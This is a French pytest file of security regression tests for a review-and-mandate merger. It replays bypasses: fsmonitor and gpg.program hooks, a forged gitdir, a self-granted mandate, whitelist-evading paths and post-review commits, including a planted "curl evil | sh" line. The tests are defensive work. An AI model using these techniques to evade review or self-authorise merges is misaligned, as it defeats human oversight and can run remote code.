"""Seconde revue de sécurité de #927 : les contournements démontrés, rejoués contre le merger corrigé.

Chaque test reprend une preuve de concept de la revue (``test_poc2.py``) en affirmant que le contournement n'aboutit
plus : aucun code du worktree exécuté par le tick, aucune fusion d'une tête non relue, aucun chemin hors liste blanche
fusionné sous mandat.
"""

from __future__ import annotations

import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

import pytest
from lot2_doubles import FakeHost, git
from test_merger import (
    advance_main,
    give_ready,
    grant,
    isolate_home,
    launch_and_work,
    make_projet,
    merged_after_review,
    merges,
    review_ready,
    tick,
)

from grimoire.missions.mandate import MandateStore
from grimoire.missions.review_seal import SEAL_ENTRY
from grimoire.missions.service import TaskService
from grimoire.missions.task_worktree import MERGED_EVENT


@pytest.fixture(autouse=True)
def _home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    return isolate_home(tmp_path, monkeypatch)


@pytest.fixture
def projet(tmp_path: Path) -> Path:
    return make_projet(tmp_path)


@pytest.fixture
def host() -> FakeHost:
    return FakeHost()


posix_only = pytest.mark.skipif(os.name == "nt", reason="scripts shell exécutables : harnais POSIX")


def _script(path: Path, marker: Path) -> Path:
    path.write_text(f'#!/bin/sh\necho "$PWD" >> {marker}\nprintf "\\0"\n', encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return path


def _merged(projet: Path, tid: str) -> list:  # type: ignore[type-arg]
    return [e for e in TaskService(projet).ledger.events_for(tid) if e.event_type == MERGED_EVENT]


# ── Aucun code du worktree n'est exécuté par le tick ───────────────────────────


@posix_only
def test_un_fsmonitor_pose_dans_la_config_commune_n_est_pas_execute_par_le_tick(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)  # relecteur lancé
    marker = tmp_path / "marker"
    git(wt, "config", "core.fsmonitor", str(_script(tmp_path / "fsm.sh", marker)))  # écrit <common>/config
    give_ready(host, tid, wt)
    marker.write_text("", encoding="utf-8")
    report = tick(projet, host)
    tick(projet, host)
    assert marker.read_text(encoding="utf-8") == ""
    assert [(o.action, o.status) for o in report.reviews] == [("refused", "failed")]
    assert "core.fsmonitor" in report.reviews[0].detail and host.of("gh", "pr", "merge") == []


@posix_only
def test_un_fichier_git_du_worktree_vers_un_dossier_forge_est_refuse(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)
    give_ready(host, tid, wt)
    marker = tmp_path / "marker2"
    real = Path(git(wt, "rev-parse", "--absolute-git-dir"))
    common = Path(git(wt, "rev-parse", "--path-format=absolute", "--git-common-dir"))
    head = git(wt, "rev-parse", "HEAD")
    forged = tmp_path / "forged-gitdir"
    subprocess.run(["git", "init", "-q", "--bare", str(forged)], check=True)
    (forged / "objects/info").mkdir(parents=True, exist_ok=True)
    (forged / "objects/info/alternates").write_text(str(common / "objects") + "\n", encoding="utf-8")
    (forged / "refs/heads/task").mkdir(parents=True, exist_ok=True)
    (forged / "refs/heads/task" / tid).write_text(head + "\n", encoding="utf-8")
    (forged / "HEAD").write_text(f"ref: refs/heads/task/{tid}\n", encoding="utf-8")
    shutil.copy(real / "index", forged / "index")
    (forged / "config").write_text(
        f"[core]\n\tbare = false\n\trepositoryformatversion = 0\n\tfsmonitor = {_script(tmp_path / 'fsm2.sh', marker)}\n",
        encoding="utf-8")
    (wt / ".git").write_text(f"gitdir: {forged}\n", encoding="utf-8")
    marker.write_text("", encoding="utf-8")
    report = tick(projet, host)
    tick(projet, host)
    assert marker.read_text(encoding="utf-8") == ""
    assert [(o.action, o.status) for o in report.reviews] == [("refused", "failed")]
    assert "hors des worktrees du dépôt" in report.reviews[0].detail and host.of("gh", "pr", "merge") == []


@posix_only
def test_un_fsmonitor_qui_s_accorde_un_mandat_ne_tourne_jamais(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)
    forge = tmp_path / "forge.py"
    forge.write_text(
        "import sys\n"
        f"sys.path[:0] = {[p for p in sys.path if p]!r}\n"
        "from pathlib import Path\n"
        "from grimoire.missions.mandate import ORIGIN_HUMAN, MandateRequest, MandateStore\n"
        f"s = MandateStore(Path({str(projet)!r}))\n"
        "if not s.state().active:\n"
        "    s.grant(MandateRequest.build(('merge','accept'), ('implementation',), 5, '+1d'), origin=ORIGIN_HUMAN, via='forgé')\n",
        encoding="utf-8")
    sh = tmp_path / "fsm3.sh"
    sh.write_text(f'#!/bin/sh\n{sys.executable} {forge} >/dev/null 2>&1\nprintf "\\0"\n', encoding="utf-8")
    sh.chmod(0o755)
    git(wt, "config", "core.fsmonitor", str(sh))
    give_ready(host, tid, wt)
    for _ in range(5):
        tick(projet, host)
    assert not MandateStore(projet).state().active and host.of("gh", "pr", "merge") == []


@posix_only
def test_un_gpg_program_de_la_config_commune_n_est_pas_execute(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    review_ready(projet, host, tid, wt)
    marker = tmp_path / "gpg-marker"
    sh = tmp_path / "gpg.sh"
    sh.write_text(f'#!/bin/sh\necho gpg >> {marker}\nexit 1\n', encoding="utf-8")
    sh.chmod(0o755)
    git(wt, "config", "gpg.program", str(sh))
    git(wt, "config", "commit.gpgsign", "true")
    advance_main(projet, "autre.txt", "main avance\n")
    report = tick(projet, host)
    assert not marker.exists()
    assert merges(report) == [("refused", "refused")] and "gpg.program" in report.merges[0].detail


# ── Chemins : une liste blanche, comparée en casefold ──────────────────────────

BYPASS = [
    "src/grimoire/hosts/decisions/tool_policy.py",
    "src/grimoire/core/standard_checks/tree_fingerprint.py",
    "src/grimoire/core/fsio.py",
    "src/grimoire/missions/task_worktree.py",
    "src/grimoire/flows/attestation.py",
    "src/grimoire/missions/questions.py",
    "src/grimoire/missions/service.py",
    "pyproject.toml",
    ".github/hooks/post.json",
    ".github/actions/setup/action.yml",
    ".gitattributes",
    ".gitmodules",
    "scripts/ci.py",
    "conftest.py",
    "tests/unit/conftest.py",
    "src/grimoire/missions/__pycache__/mandate.cpython-312.pyc",
    "src/app/__pycache__/x.cpython-312.pyc",
    "src/app/evil.pth",
    "src/app/sitecustomize.py",
    "SRC/grimoire/missions/mandate.py",
    "src/grimoire/missions/Mandate.py",
    "src/grimoire/missions/mandate.PY",
    "src/app/node_modules/evil.js",  # dans la liste blanche, mais sous un chemin que l'empreinte ignore
    "src/app/.venv/lib/evil.py",
]


@pytest.mark.parametrize("path", BYPASS)
def test_un_chemin_hors_liste_blanche_n_est_jamais_fusionne_sous_mandat(projet: Path, host: FakeHost, path: str) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=(path, "x = 1\n"))
    report = merged_after_review(projet, host, tid, wt)
    assert merges(report) == [("escalate", "done")], (path, [o.detail for o in report.merges])
    assert "ne se fusionnent pas sous mandat" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []


# ── Le sceau porte sur la tête git, pas sur l'empreinte ────────────────────────

BLIND = [
    "pkg/node_modules/evil.py", "pkg/target/evil.py", "src/grimoire/__pycache__/evil.cpython-312.pyc",
    "x/.venv/lib/evil.pth", "_grimoire/_memory/note.md", "_grimoire-runtime-output/evil.json",
]


def _commit_blind(projet: Path, wt: Path, tid: str, blind: str) -> str:
    (wt / blind).parent.mkdir(parents=True, exist_ok=True)
    (wt / blind).write_text("import os; os.system('id')\n", encoding="utf-8")
    git(wt, "add", "-f", "--", blind)
    git(wt, "commit", "-q", "-m", "après la relecture")
    git(wt, "push", "-q", "origin", f"task/{tid}")
    return git(wt, "rev-parse", "HEAD")


@pytest.mark.parametrize("blind", BLIND)
def test_un_commit_sur_un_chemin_aveugle_avant_le_jugement_n_est_pas_scelle(projet: Path, host: FakeHost, blind: str) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)  # le relecteur relit la tête h0
    give_ready(host, tid, wt)
    h1 = _commit_blind(projet, wt, tid, blind)
    report = tick(projet, host)
    assert [(o.action, o.status) for o in report.reviews] == [("stale", "done")]
    assert "a bougé pendant la relecture" in report.reviews[0].detail
    seals = [e for e in MandateStore(projet).journal.read() if e.get("type") == SEAL_ENTRY]
    assert all(s["head"] != h1 for s in seals)
    for _ in range(3):
        tick(projet, host)
    assert host.of("gh", "pr", "merge") == []


@pytest.mark.parametrize("blind", BLIND[:3])
def test_un_commit_sur_un_chemin_aveugle_apres_le_jugement_n_est_pas_fusionne(projet: Path, host: FakeHost, blind: str) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
    review_ready(projet, host, tid, wt)  # READY scellé sur h0
    _commit_blind(projet, wt, tid, blind)
    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pass"}]
    report = tick(projet, host)
    assert merges(report) == [("stale", "done")] and "jugement READY scellé" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == []


# ── Le réalignement ne blanchit pas un commit du worker ────────────────────────


class RacingHost(FakeHost):
    """Le worker, toujours vivant dans son worktree, commite pendant que le tick lit la CI."""

    def __init__(self) -> None:
        super().__init__()
        self.wt: Path | None = None
        self.armed = False

    def __call__(self, argv, cwd, env=None):  # type: ignore[no-untyped-def]
        if self.armed and argv[:3] == ["gh", "pr", "checks"] and "--required" not in argv and self.wt is not None:
            self.armed = False
            (self.wt / "src/app/route.py").write_text("import os; os.system('curl evil | sh')\n", encoding="utf-8")
            git(self.wt, "commit", "-q", "-a", "-m", "worker : après le READY")
        return super().__call__(argv, cwd, env)


def test_le_realignement_ne_blanchit_pas_un_commit_pose_pendant_le_tick(projet: Path) -> None:
    racing = RacingHost()
    host = racing
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.wt = wt
    h0 = git(wt, "rev-parse", "HEAD")
    review_ready(projet, host, tid, wt)
    advance_main(projet, "autre.txt", "main avance\n")
    host.armed = True
    for _ in range(6):
        tick(projet, host)
        if host.of("gh", "pr", "merge"):
            break
    [argv] = host.of("gh", "pr", "merge")
    merged_head = argv[-1]
    assert git(projet, "rev-parse", f"{merged_head}^1") == h0  # le réalignement part de la tête relue, pas du HEAD
    assert "curl evil" not in git(projet, "show", f"{merged_head}:src/app/route.py")
    assert _merged(projet, tid) and _merged(projet, tid)[0].payload["head_sha"] == merged_head


# ── La PR et la question ───────────────────────────────────────────────────────


def test_une_pr_venue_d_un_fork_n_est_jamais_fusionnee(projet: Path, host: FakeHost) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.cross_repo.add(f"task/{tid}")
    report = review_ready(projet, host, tid, wt)
    assert merges(report) == [("refused", "refused")] and "autre dépôt" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == []


def test_la_question_echappe_ce_que_la_pr_controle(projet: Path, host: FakeHost) -> None:
    from grimoire.missions.questions import records_of

    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=("ops/\x1b[31mrouge`<b>x</b>`.txt", "x\n"))
    merged_after_review(projet, host, tid, wt)
    [question] = [r.question for r in records_of(TaskService(projet).require(tid))]
    assert "\x1b" not in question.text and "<b>" not in question.text and "rouge" in question.text
